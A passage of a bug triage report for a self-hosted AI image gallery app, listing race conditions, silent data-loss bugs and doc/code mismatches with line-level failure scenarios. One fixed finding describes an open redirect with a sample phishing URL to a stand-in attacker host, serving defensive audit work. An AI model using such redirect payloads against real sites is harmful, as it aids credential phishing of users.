**How it fails.** On any gallery/detail page, click star 4 on an unrated image. buildStars() (line 4829-4844) immediately sets its closure variable `rating = 4` (line 4838) and fires setRating() (line 4813-4821), which POSTs to /rate/<id> and only calls updateStars() to redraw the stars `if (data.ok)` (line 4819) — there is no .catch() and no else/rollback branch. If that request fails outright (dropped connection, a transient 5xx from the server, or r.json() throwing on a non-JSON error body), the promise chain never reaches updateStars(): the UI keeps showing 0 filled stars, but the widget's internal `rating` var is already 4. The user, seeing nothing happened, clicks the same 4th star again to retry — but the click handler now computes `newVal = (rating === star) ? 0 : star` = `(4===4)?0:4` = 0 (line 4837), so the 'retry' actually submits rating:0 (clear) instead of the intended 4. The user never sees an error and ends up with the opposite of what they clicked.

### `M11` moonglade_logging.py:92

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Catalog & Misc
- **Category:** error-handling
- **Batch:** -

**What it is.** The crash hook only overrides `sys.excepthook`, which Python calls solely for uncaught exceptions on the main thread; `threading.excepthook` is never installed, so an uncaught exception in any background worker thread never reaches the persistent log file, contradicting the module's stated purpose of guaranteeing every crash is on record.

**How it fails.** A background worker thread (e.g. a job the web app spins up outside Flask's own request-handling, such as a long-running sync/build job) raises an uncaught exception. Python routes it through the default `threading.excepthook`, which prints a traceback to stderr and returns -- `_hook` in this file is never invoked because that hook only fires for the main thread. If that thread's stderr isn't being watched (the exact 'terminal window is already gone' scenario this module's own docstring says it exists to cover), the crash leaves zero trace in out_dir/logs/moonglade.log, and the job simply appears to have died with no record of why.

### `M12` moonglade_mcp.py:112

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Catalog & Misc
- **Category:** data-consistency
- **Batch:** -

**What it is.** moonglade_similar.py has no counterpart to sync()/rebuild() that removes a media_id from the CLIP sidecar table when it's purged/deleted from the catalog, so the `similar` MCP tool's loop silently drops any neighbor whose media_id no longer resolves via g.get_row, shrinking the returned `count` below the requested `limit` with no indication why.

**How it fails.** An image gets deleted/purged from the catalog (its catalog.db row removed) after it was already embedded into moonglade.images. Weeks later the owner calls `similar(media_id=X, limit=24)` on an unrelated, visually-similar image; several of the top-25 nearest-neighbor hits from the CLIP index are that now-deleted media_id (still present in the sidecar table, embedding never pruned). Each such hit fails `g.get_row(DB, mid)` and is silently skipped, so the tool returns e.g. `count: 15` for a `limit: 24` request with no error or explanation, and the caller has no way to know results were truncated by stale index entries rather than there simply being fewer similar images.

### `M13` moonglade_mcp.py:123

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Catalog & Misc
- **Category:** correctness
- **Batch:** -

**What it is.** set_rating writes via `g.update_rating` (a plain `UPDATE ... WHERE media_id=?`, 0 rows affected if the id doesn't exist) with no existence check, then unconditionally returns `{"ok": True, ...}`, so rating a nonexistent media_id is reported as a successful write that never happened.

**How it fails.** An agent (or the owner) calls `set_rating(media_id="abc123", rating=5)` with a mistyped or stale media_id (e.g. copied from an older search_catalog result for an image that was since re-imported under a different id, or a typo). The tool returns `{"ok": true, "media_id": "abc123", "rating": 5}` even though the UPDATE matched zero rows and catalog.db is unchanged -- the caller believes the rating was set and moves on, and the image is silently left unrated.

### `M14` moonglade_gallery.py:5607

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Deleting & Trash
- **Category:** correctness
- **Batch:** -

**What it is.** bulkSendCast()'s video filter only works for cards on the currently rendered page, so a video selected on a different page slips through the 'cast is images' guard and gets sent to The Loom.

**How it fails.** User is viewing page 2, selects a video (selection persists cross-page via localStorage 'gallery_sel'), then navigates to page 1 and clicks Actions -> 'Send to The Loom (cast)'. document.getElementById('card-'+mid) at line 5607 returns null for that video (its card DOM element only exists on page 2, not page 1), so the `if (card && card.getAttribute('data-video') === '1') return;` exclusion never triggers, and the video's media_id is pushed into ids and sent as '/loom?cast=<ids>' -- despite the adjacent code comment explicitly stating 'cast is images' -- corrupting the cast payload sent to the Loom, a core generation-hub feature.

### ~~`M15` moonglade_gallery.py:11710~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Same `_safe_back()` guard on the delete/collection redirect targets. Verified: `?back=https://evil.example/x` no longer appears in the Location header.
- **Area:** Deleting & Trash
- **Category:** open-redirect
- **Batch:** A

**What it is.** The 'back' redirect target used by /delete/<id>, /delete-bulk, /delete-tasks-bulk, /collection-add, /collection-remove and /bulk-replace-prompt is taken straight from request args/form and passed to redirect() with no same-origin/relative-path validation, making every one of these POST actions an open redirect.

**How it fails.** An attacker sends a signed-in user a link to the app's own real, trusted domain: /image/<id>?back=https://evil.example/fake-login. The detail page (same-origin GET, so SameSite=Lax doesn't block it) echoes that back value into its Delete/rate/collection forms' hidden 'back' field or action query string. When the user performs their own legitimate action (e.g. clicks Delete, which is exactly what they intended to do), delete_one() at line 11704-11710 does `return redirect(back)` with no validation that back is a local path, bouncing the user's browser from the real app straight to evil.example immediately after a genuine action -- a classic setup for a credential-phishing page that the user has no reason to distrust because the preceding action just worked on the real site. The same unguarded pattern repeats at delete_bulk (line 11727), the delete_tasks_bulk _back() helper (lines 11888-11890), collection_add/collection_remove, and bulk_replace.

### `M16` moonglade_backup.py:5611

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** misclassification
- **Batch:** -

**What it is.** run_generate folds any outputs.videos media ids into the same download loop used for outputs.batch/mediaId image ids, so a video task recovered via `--generate --task-id` gets saved into images/ and cataloged with is_video left at its blank default.

**How it fails.** A user runs `python moonglade_backup.py --generate --task-id <id>` where <id> is actually an i2v or reference-video task (e.g. the wrong id pasted, or a script looping over a mixed list of task ids without checking type). _task_image_media(outputs) returns [] since a video-only task has no batch/mediaId, but the loop at lines 5609-5611 still appends the video's own mediaId into `mids`. The per-mid loop (5629-5677) then resolve_media/downloads that mp4 into out/images/ and writes a catalog row via `full = {f: "" for f in CATALOG_FIELDS}` (line 5641) that never sets is_video, leaving it at CATALOG_FIELDS' blank default. The gallery's image listing filters on `COALESCE(is_video,'') != '1'` (moonglade_gallery.py), so this row is served as an image; the browser tries to render the mp4 in an <img> tag (broken tile), and none of the video-specific handling (poster thumbnail, faststart remux) that _download_video_task normally runs ever touches this file.

### `M17` moonglade_backup.py:6424

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** correctness
- **Batch:** -

**What it is.** An edit task whose chat model isn't in the hardcoded 2-entry EDIT_MODELS table gets permanently mislabeled with the generic literal "Edit" instead of a real model name, and can never be fixed by --fix-models.

**How it fails.** Submit or recover an edit task whose chat.modelId isn't 'edit-pro' or 'reference-pro' (EDIT_MODELS, moonglade_backup.py:5193) — reachable via `--edit-image --params-json <override with a custom/newer modelId>` or `--edit-image --task-id <id>` recovering a chat task originally created outside this app (e.g. PixAI's web UI with a model added after this table was last updated). extract_full_meta's chat_label (line 2946) resolves to "" since edit_model_by_id finds no match, so run_edit_image line 6424 (`fm.get("model_name", "") or "Edit"`) writes the literal string "Edit" into the catalog row. Later, `_needs_model_fix` (line 6451-6452) sees name="Edit" — non-empty, non-digit, != model_id — and returns "", so `run_fix_models` never queues the row for resolution. The row is stuck forever showing the generic "Edit" instead of the real model name, and even loses the distinction between which of PixAI's edit models actually produced it.

### `M18` moonglade_backup.py:6494

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** silent-exception-swallowing
- **Batch:** -

**What it is.** `--fix-models --relabel-removed` cannot tell a transient network/API failure apart from a genuinely-removed model, so a mere hiccup permanently mislabels a still-valid model as "Unknown or removed model" with no way to self-heal on a retry.

**How it fails.** Run `python moonglade_backup.py --fix-models --relabel-removed` while one of the distinct model ids being resolved hits a transient network error, timeout, or PixAI 5xx/429. `model_name_gql` (line 2916-2917) catches ALL exceptions broadly and returns `name = mid` (the id unchanged) rather than raising or signaling failure. Back in run_fix_models, the check `if name and name != vid and not str(name).isdigit()` is False (name==vid), so every row using that still-perfectly-valid model falls into the unresolved branch and, because --relabel-removed is set, line 6494 overwrites `r["model_name"] = "Unknown or removed model"` for all of them; `save_catalog` persists this incorrect label immediately after. Re-running --fix-models does not repair it: `_needs_model_fix` (line 6451-6452) now sees a non-empty, non-digit name that isn't the id, so it reports the row as already resolved and never re-queues it — the mislabel is permanent without manual DB editing.

### `M19` moonglade_gallery.py:8052

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** silent-data-loss
- **Batch:** -

**What it is.** setEditModel() silently drops extra reference images when switching to a model with a lower reference cap, with no toast or warning (unlike the near-identical truncation in bulkSendVideo, which does toast).

**How it fails.** User selects Reference Pro (max_refs:10), adds 6 reference images via the '+ ref' picker. User then clicks the Edit Pro toggle (max_refs:4) -- setEditModel('edit-pro') computes maxAdd=4-1=3 and executes 'editRefs=editRefs.slice(0,3)' at line 8052, dropping 3 of the 6 chosen references with no message of any kind (contrast bulkSendVideo's explicit Toast for the same class of cap-truncation). The user submits an edit believing all 6 references are in play; only 3 actually are.

### `M20` moonglade_gallery.py:13629

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** input-validation
- **Batch:** -

**What it is.** _gen_args_from_payload's own docstring claims the Generate drawer's JSON is 'Clamped to safe ranges,' but only `count` (1-4) is actually clamped -- width, height, steps, and cfg are cast with no upper bound and fed straight into the real submit (core._gen_parameters only floors width/height to 64 via _dim, never caps them).

**How it fails.** A malformed or malicious signed-in client (the drawer is explicitly login-tier, any LAN device) POSTs {width: 999999999, height: 999999999, steps: 999999} directly to /api/generate (bypassing the UI's own dropdowns/sliders). num() casts these straight through with no ceiling, core._gen_parameters rounds them to a multiple of 8 with only a 64px floor, and the unbounded values are submitted to PixAI as-is -- exactly the 'safe ranges' clamp the function's docstring promises never happens, so nothing here stops an oversized/absurd request from reaching PixAI and being priced/charged at whatever that produces.

### `M21` moonglade_gallery.py:14153

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Generating & Cost
- **Category:** error-handling
- **Batch:** -

**What it is.** /api/fix's exception handler still just returns _redact_host_paths(str(e)) and never calls _log_gen_failure, even though Fix is documented as the one drawer action that ALWAYS spends credits (never covered by a free card) and _log_gen_failure exists specifically because un-logged spend failures on /api/generate were 'undiagnosable' in production on 2026-07-26.

**How it fails.** A hand/face Fix submit fails (PixAI content-moderation decline, rejected box, transient API error) after credits have already been spent (Fix has no card coverage, so every attempt bills). Unlike /api/generate (line 14098) and /api/edit (line 14127), which both log the redacted error AND the request shape via _log_gen_failure for exactly this class of failure, api_fix's except block (line 14153-14154) only returns the message to the browser and writes nothing to the server log -- the owner is left with the same undiagnosable-decline problem _log_gen_failure was built to solve, but only for the one drawer action guaranteed to have actually spent money.

### ~~`M22` moonglade_gallery.py:3928~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `_scheduler_loop` now takes `_sched_lock` around its read-modify-write of schedule.json.
- **Area:** Job Tracker & Watcher
- **Category:** race-condition
- **Batch:** C

**What it is.** _scheduler_loop reads and writes schedule.json via _load_sched/_save_sched without ever taking _sched_lock (declared at line 3876 but unused here), so a concurrent settings save that DOES take the lock can be silently reverted by the scheduler writing back its stale in-memory copy.

**How it fails.** Schedule is Enabled with a 1-hour interval. At the moment _scheduler_loop loads schedule.json (`s = _load_sched()`, inside the try starting at line 3911) and fires the due action via _panel_run(action) (line 3927), the owner opens the Panel and unticks 'Enabled' (or changes action/workers); that POST correctly wraps its read-modify-write in `with _sched_lock:` and saves `enabled: False`. _scheduler_loop never acquired that lock, so it proceeds to set `s['last_run'] = _time.time()` (line 3928) on its already-stale copy (still `enabled: True`) and calls `_save_sched(s)` (line 3929), overwriting schedule.json and silently re-enabling the toggle the owner just turned off -- the background full-history scan the owner tried to stop keeps firing every interval with no UI indication it's still on.

### `M23` moonglade_gallery.py:14741

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Job Tracker & Watcher
- **Category:** correctness
- **Batch:** -

**What it is.** In /api/loom/export, when a silent shot is exported untrimmed and ffprobe fails to read its duration, the synthesized-silence span falls back to a hardcoded 0.1s instead of the clip's real length, desyncing audio for every later segment in the concatenated export -- the exact failure the surrounding code says it exists to prevent.

**How it fails.** A shot rendered without the "Generate audio" toggle (no audio stream) is exported with its trim-out left unset (co is None, the default/common case), and probe_duration(path) returns None (e.g. ffprobe isn't on PATH even though the earlier shutil.which("ffmpeg") check passed, or ffprobe errors on that file). span becomes max(0.1, (ci+0.1)-ci) == 0.1 regardless of the clip's actual multi-second length, so that segment's video plays its full duration while only 0.1s of matching silence is generated -- every subsequent segment's audio in loom_cut.mp4 shifts out of sync with its video.

### `M24` moonglade_gallery.py:14864

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Job Tracker & Watcher
- **Category:** correctness
- **Batch:** -

**What it is.** /api/loom/export-bundle computes the list of media_ids it couldn't find on disk but only ever returns a COUNT (X-Bundle-Missing-Count header), never the actual list, contradicting the adjacent comment that says "the client surfaces this list so the owner knows what didn't travel."

**How it fails.** A project references a shot whose rendered clip was moved/deleted from the backup folder, or was generated on a different machine and never synced. Exporting the Full Bundle zip succeeds and the response carries X-Bundle-Missing-Count: 2, but the two actual media_ids in `missing` (computed at line 14852-14859) are discarded after `len(missing)` is taken -- never written into the header, the zip, or anywhere else the client can read. The owner learns "2 files are missing" with no way to identify which act/shot they belong to short of manually diffing every project reference against the zip's media/ folder.

### `M25` static/mg-notify.js:1343

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Job Tracker & Watcher
- **Category:** notification-state-stuck
- **Batch:** -

**What it is.** The job-detail popover's live 'Time Spent' ticker (detailTick, started in openDetail) is only stopped when the job disappears from the list entirely, never when it merely transitions from running to a terminal status while the popover stays open, so it keeps counting upward past the job's actual completion.

**How it fails.** User clicks a running job's row to open the detail popover (built specifically per the 2026-07-23 field report so owners can get a task ID for a slow/stuck generation without server access). openDetail() at line 1332 starts a 1s setInterval (line 1343) because status was 'running' at open time, and that interval recomputes 'Time Spent' as `Date.now()/1000 - started_at` unconditionally. The job then finishes. render() (line 1361), called every poll, does call renderDetail() to refresh the popover's numbers (line 1365) — but only stops the ticking interval via closeDetail()/stopTick() when the job is absent from jobsById (line 1366), never when it merely changed status. So one second after the correct final duration briefly renders, the still-running interval overwrites it with a live, ever-growing 'X so far' figure computed against the current wall-clock time, not the job's actual end time. A user who leaves the popover open while a generation finishes sees a fictitious, continuously incrementing elapsed time for a job that is already done.

### `M26` moonglade_gallery.py:7272

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Pickers & Drawer
- **Category:** data-loss
- **Batch:** -

**What it is.** Deleting a saved prompt snippet fires instantly on mousedown with no confirmation, permanently removing it server-side on a single accidental press.

**How it fails.** In the compact #snip-menu popover (min-width 220px, max-width 340px), the delete '×' button sits directly beside the 'insert' button in the same .snip-row, wired to `onmousedown="event.preventDefault();Snips.del(i)"` at line 7272 -- not onclick, not gated by confirm(). A single stray press near the insert button (easy to fat-finger in that narrow row, and mousedown fires before the user could release/drag away to cancel) calls Snips.del(i) at line 7280, which does `list.splice(i,1); persist();` -- immediately POSTing the truncated list to /api/snippets and permanently deleting the saved prompt, with no undo and no 'are you sure'.

### `M27` static/mg-generate-drawer.js:533

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Pickers & Drawer
- **Category:** correctness
- **Batch:** -

**What it is.** `_applyModelGating()` force-switches an unsupported vmode via `_setMode()` whenever the Model dropdown changes, and `_setMode()` never copies the outgoing mode's picks over — so changing models silently discards every reference image/video/audio the user just picked in Multi-Reference mode, with no warning.

**How it fails.** In Multi-Reference (r2v) mode, pick 3-4 images into `_imgSlots` plus a video ref. Change the Model dropdown to 'V3.0 Flash' (`v3.0.1`), whose `MODEL_VMODES` only allows `['i2v']`. `_applyModelGating()` (line 528-533) sees `allowed.indexOf('r2v') === -1` and calls `_setMode('i2v')`. `_setMode()` (line 492-511) sets `this._slots = [this._slots[0] || null]` — `_slots` was never populated while in r2v mode (r2v uses the separate `_imgSlots`/`_vidSlots`/`_audSlot` banks), so the new Start Frame slot renders empty and every picked reference is gone. There is no confirmation, no `mg-error`, nothing — the user just sees the slots empty out and has to re-pick everything, exactly the class of silent-data-loss bug this file's own `setRefs()`/`prefill()` comments (lines 1117-1120, 1149-1151) show the author already fixed for other paths but missed here.

### ~~`M28` static/mg-upscale-panel.js:433~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `open()` now carries an `_openSeq` token, matching `_price()`'s existing idiom.
- **Area:** Pickers & Drawer
- **Category:** race-condition
- **Batch:** D

**What it is.** `open()`'s `/api/image-meta` fetch has no stale-response guard (unlike `_price()`'s `_costSeq` pattern elsewhere in this same file), so opening the panel on two different images in quick succession can leave it — and a subsequent submit — bound to the wrong image if responses arrive out of request order.

**How it fails.** From the details/lightbox surface, click 'Upscale' on image A, then immediately click 'Upscale' on image B (e.g. fast lightbox next/prev while the flyout stays mounted) before A's `/api/image-meta/<A>` response has returned. If A's response resolves after B's (slower row lookup, network reordering), `done(rowA)` (line 417) runs last and overwrites `self.src`, the displayed size/model, and the ratio cap with image A's data — while the user is looking at image B and believes that's what they're about to upscale. Clicking Upscale then submits `_payload()` (line 450) with A's `model_id`/`prompt`/`width`/`height`/`ref_media_id`, silently upscaling the wrong image and charging credits against it.

### ~~`M29` moonglade_backup.py:1273~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `maybe_compact_jobs` runs under a new `_jobs_compact_lock`, with a pid-stamped scratch file and `_atomic_replace`.
- **Area:** Security & Access
- **Category:** race-condition
- **Batch:** C

**What it is.** maybe_compact_jobs() rewrites jobs.jsonl through a fixed, non-unique temp filename (`jobs.jsonl.tmp`) with no locking at all, unlike every AUTH_USERS writer in this same file which was deliberately locked after an identical class of race was reproduced live.

**How it fails.** jobs.jsonl has just crossed _JOBS_COMPACT_AT (2000) lines. Two concurrent /api/jobs polls (e.g. two browser tabs/devices, or the gallery page plus The Loom, both legitimately signed in per Setup.md's 'sign in with it from any device', served by Flask's threaded=True per this file's own _accounts_lock docstring) both call maybe_compact_jobs() and both pass the `n <= _JOBS_COMPACT_AT` gate. Both open the SAME hardcoded tmp path in truncating 'w' mode, write their own independently-computed `kept` lists, and both call `tmp.replace(path)`. The interleaving can truncate/corrupt the shared tmp file (later silently dropped line-by-line via `_reconstruct_jobs`'s bare `except ValueError: continue`) or let one thread's replace clobber the other's, losing job-history events that landed between the two reads/writes -- and any resulting OSError is swallowed by the bare `except OSError: ... pass` with no logging, so the Job Tracker log can silently stop compacting (grow unbounded) or lose entries with zero operator-visible signal.

### `M30` moonglade_gallery.py:8761

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Security & Access
- **Category:** functional-bug
- **Batch:** -

**What it is.** The video branch of the detail page's media block renders a <video>/<source> pointing at the media file unconditionally, with no check that the file actually exists on disk, unlike the parallel image branch.

**How it fails.** For an image row, img_url is only set if find_image_file() locates the file, and the template falls back to a friendly 'Image file not found on disk.' message (lines 8772-8774) when it doesn't. For a video row (row.is_video == '1'), the template unconditionally emits `<video><source src="{{ url_for('video_file', media_id=row.media_id) }}">...</video>` (lines 8761-8767) with no existence check. If the catalog has a video row whose file is missing on disk (a state the app's own Health dashboard tracks and expects — 'Missing files'), the user sees a broken/blank video player with no explanation instead of the clear message images get in the same situation.

### `M31` moonglade_gallery.py:10906

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Security & Access
- **Category:** doc-code-mismatch
- **Batch:** -

**What it is.** api_users_add() hard-rejects any non-localhost caller with 403 "localhost-only", directly contradicting wiki/Setup.md's documented claim that adding a new gallery login account is available to "Any signed-in session" with "every account carries equal trust, there's no separate admin role."

**How it fails.** wiki/Setup.md ("Adding more accounts" section) tells the owner: "To add a person or a second device after that, open Panel -> Users and add them there. Any signed-in session can: every account carries equal trust, there's no separate admin role." Following that instruction, the owner gives a guest a LAN login and has them add their own account from a tablet's browser via Panel -> Users -> Add user. The POST reaches api_users_add with a valid session and valid CSRF, but `if not _is_local_request(): return jsonify({"error": "localhost-only"}), 403` at moonglade_gallery.py:10906-10907 rejects it unconditionally for any non-127.0.0.1/::1 remote_addr -- the documented workflow cannot be completed from any device except the one physically running the server, with no indication in Setup.md that this restriction exists.

### `M32` moonglade_gallery.py:11167

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Security & Access
- **Category:** race-condition
- **Batch:** -

**What it is.** export_csv_download() counts filtered catalog rows in one query and then fetches exactly that many rows in a second, later query with no lock between them, so a concurrent catalog write (e.g. a running "Sync now" Panel job) can silently truncate the exported CSV with no error or warning that it's incomplete.

**How it fails.** User clicks "Sync now" in the Panel, a background job that runs for minutes while inserting new rows into catalog.db as media downloads. While it's running, the same user opens the filtered gallery grid and clicks "Download catalog (CSV)". `_, total = query_catalog(db_path, page=1, page_size=1, **filters)` at line 11167 counts, say, 500 matching rows; before `rows, _ = query_catalog(db_path, page=1, page_size=max(total, 1), ...)` at lines 11168-11169 runs, the sync job inserts 30 more matching rows. The second query still only takes `page_size=500`, so the CSV silently ships 500 of the now-530 matching rows -- the newest 30 are dropped with no truncation notice in the downloaded file.

### ~~`M33` loom/master-storyboard.jsx:1825~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The Image tab's Generate button now disables for a missing model or empty prompt, matching its sibling tabs.
- **Area:** The Loom
- **Category:** correctness
- **Batch:** E

**What it is.** The Image tab's Generate button, unlike the Edit and Reference tabs' Go buttons, never disables for a missing model or empty prompt even though the submit handler itself requires both.

**How it fails.** User opens the Loom's Image tab before picking a model (imgModel is null) and clicks '✦ Generate reference image' — the button is fully enabled (disabled only checks busyI/LoRA state), but genImage() immediately rejects with 'pick a model first', producing a dead-end click that sibling tabs (Edit: disabled={busyE || !src}; Reference: disabled={busyR || !refs.length}) proactively prevent.

### ~~`M34` loom/master-storyboard.jsx:2465~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The autosave cancel is scoped to the board being deleted. OWNER-TESTED.
- **Area:** The Loom
- **Category:** data-loss
- **Batch:** -

**What it is.** Deleting any non-active storyboard unconditionally cancels the currently-open storyboard's pending 600ms autosave, silently discarding its latest unsaved edit.

**How it fails.** User is mid-edit on the currently open project (e.g. typing a shot's prompt), which schedules a 600ms debounced autosave via the single shared `saveTimer` ref (the autosave effect only ever tracks the ACTIVE project — there is no per-project timer). Within that 600ms window they open the Project Switcher and delete a different, unrelated old storyboard. `deleteProject` runs `clearTimeout(saveTimer.current)` (line 2465) unconditionally, before checking `id === activeId`. For the non-active-delete branch (`else { await sDel(PPRE + id); }`, line 2474-2475) neither `project` nor `activeId` state changes, so the autosave effect never reruns to reschedule the cancelled write. If the user makes no further edit to the active project afterward, that last change is silently never persisted to storage and is lost on reload — with no error or indication anything was dropped.

### `M35` loom/src/loom-core.js:214

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** The Loom
- **Category:** correctness
- **Batch:** -

**What it is.** pickTarget()'s nextTag(items, "@image") includes the hardcoded structural fallback tags ("@image8"/"@image9") that untagged open/close frames carry, so appending a new Multi-Reference pick can get stamped with an inflated, meaningless tag number.

**How it fails.** An FLF shot has untagged open+close frames (each defaults to fallback tag "@image8"/"@image9" per line 138) plus one cast member tagged "@image1" — 3 real image items. Picking a 4th reference via the drawer's picker (a slot index past items.length) calls pickTarget() → nextTag(items, "@image"), which scans the tags "@image8", "@image9", "@image1" and returns "@image10" for the new ref's stored .tag — even though the shot only has 3 real images and this is really its 4th (@image4 by position). The stored tag is now numerically disconnected from the shot's actual reference count, and if this same ref later falls out of shotImageRefs()'s live position numbering (e.g. via the 6-cap issue above, or simply because it becomes momentarily unresolvable), that bogus "@image10" leaks into the assembled prompt as a citation with no relation to anything actually uploaded.


## LOW

### ~~`L01` moonglade_gallery.py:5869~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The one-shot `collected=`/`replaced=` param is stripped before the URL is captured as `back`.
- **Area:** Deleting & Trash
- **Category:** correctness
- **Batch:** A

**What it is.** bulkAddCollection() (and bulkReplacePrompt()) build the redirect 'back' URL from the raw location.href without stripping the prior one-shot 'collected='/'replaced=' query param, so repeating the action stacks the param and the success banner shows a stale count.

**How it fails.** User selects images and clicks '+ Add to collection', naming 'Elves' -> server redirects to '...?collected=3', banner shows 'Added 3 image(s)'. Without a fresh navigation, user selects more images and clicks '+ Add to collection' again -> add('back', location.href) at line 5869 captures the URL still containing '?collected=3', and /collection-add (moonglade_gallery.py:12078-12085) appends '&collected=<newN>' rather than replacing it, producing '...?collected=3&collected=7'. Flask's request.args.get('collected') returns the FIRST value ('3'), so the banner incorrectly reports 'Added 3 image(s)' again even though 7 were actually added this time. The sibling bulkRemoveCollection() (lines 5889-5890) explicitly strips its own 'uncollected' param from back for exactly this reason, but bulkAddCollection and bulkReplacePrompt (line 5856) were never given the same fix.

### `L02` static/mg-notify.js:495

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Job Tracker & Watcher
- **Category:** resource-leak
- **Batch:** -

**What it is.** Ach.close() never clears the Folio-of-Honors carousel's _actTimer, so the auto-rotate setInterval (set in renderCarousel, line 658) keeps firing every 3.5s and rebuilding hidden DOM indefinitely after the achievement modal is dismissed.

**How it fails.** User opens the achievement modal (Ach.open() -> load(false) -> render(d) -> renderGrid(d) -> renderCarousel(d, ladders), which starts `_actTimer=setInterval(...)` at line 658). User closes the modal via Ach.close() (line 495), which only toggles the 'open' CSS class off — it never touches _actTimer. Because #hall-carousel-slot is merely hidden via an ancestor's display:none, not removed from the DOM, the interval keeps finding it and calling renderCarousel() (full innerHTML rebuild + re-binding of nav/pip button handlers) every 3.5 seconds for the rest of the page's life, doing real work for a UI element nobody can see. It isn't unbounded (the next Ach.open() clears and replaces it via renderGrid's own guard at line 662), but for however long the modal stays closed the background timer runs unchecked, wasting CPU on every idle page that ever opened the Folio of Honors once.

### `L03` moonglade_gallery.py:9558

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Security & Access
- **Category:** authorization-ux
- **Batch:** -

**What it is.** The 'Stop this job' button in the Control Panel is rendered for every signed-in session (including LAN/non-local), even though stopping a job is documented and server-enforced as localhost-only, causing LAN users to hit a confirm-then-403 dead end.

**How it fails.** Every other localhost-restricted control on this same page (destructive Maintenance buttons via the `actions` filter, 'Set launcher icon' at line 9617, Trash delete-forever/empty at lines 9725/9734, the Reset-password button at 9659) is wrapped in `{% if panel_is_local %}` so LAN sessions never see a control they can't use. The '■ Stop this job' button (line 9558) has no such gate, and poll() (lines 10108-10109) shows it to anyone whenever a job is running, regardless of panel_is_local. A LAN user watching a long-running Sync clicks Stop, confirms the 'Stop the running job?' dialog, and the fetch to /api/panel/cancel returns {"error":"localhost-only"} (confirmed enforced server-side) — a dead end the app's own 2026-07-24 fix explicitly eliminated for every other destructive control, and one the Wiki's Control-Panel.md documents should behave the same way ('Like the destructive jobs below, stopping is restricted to the machine hosting the gallery').

### `L04` moonglade_gallery.py:13345

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Security & Access
- **Category:** spec-contradiction
- **Batch:** -

**What it is.** /api/achievements masks hidden, unearned Feats-of-the-Athenaeum entries to a '???' placeholder but leaves them in the achievements array, so the exact count of undiscovered feats is visible in the raw JSON response even when zero have ever been earned, contradicting the wiki's stated 'no placeholder count... found by playing, not by reading' design.

**How it fails.** A user who has earned zero Feats opens DevTools -> Network and inspects /api/achievements. The masking loop (lines 13341-13348) only mutates each hidden+unearned entry's name/desc/id in place ('hidden-feat-1', 'hidden-feat-2', ...) -- it never removes them from result['achievements']. Counting those synthetic entries tells the user precisely how many secret feats exist before discovering any of them, which directly contradicts wiki/Folio-of-Honors.md's '...and one more' section promising 'No tab, no rail entry, no placeholder count, until the day you earn your first one.'

---

## Refuted and dropped (5)

Recorded so they are not re-reported by a later pass.

- **moonglade_gallery.py:230** -- save_catalog's upsert builds each column value with `r.get(f, "") or ""`, which silently converts any falsy-but-meaningful value (Python int/float 0, False) into an empty string, conflating it with "field never captured" -- exactly the conflation the paid_credit column comment (lines 82-86) says must never happen.
- **moonglade_gallery.py:7176** -- The 'claim free credits' button has no in-flight guard, so a double-click fires two concurrent /api/claim requests and can show the user a contradictory failure toast right after a successful claim.
- **moonglade_gallery.py:14030** -- /api/price only re-resolves a model's version_id when the client sent none, while /api/generate always re-resolves and validates version_id against model_id -- so a stale version_id paired with a new model_id (the exact 'fast model switch' race the code's own 2026-07-24 comment describes) gets priced/free-card-checked against the WRONG model but submitted against the correct one.
- **moonglade_backup.py:2769** -- resolve_version_meta/resolve_latest_version blindly use rows[0] without checking it has a version_id, unlike the sibling list_model_versions which explicitly skips id-less rows.
- **moonglade_backup.py:5060** -- build_shot_video_params falls back to v4.0.1's numeric modelId for a reference-video (R2V/V2V) shot whose model has no published id (v2.7, v3.0.1), sending a top-level modelId that contradicts the actual engine named in referenceVideo.model.
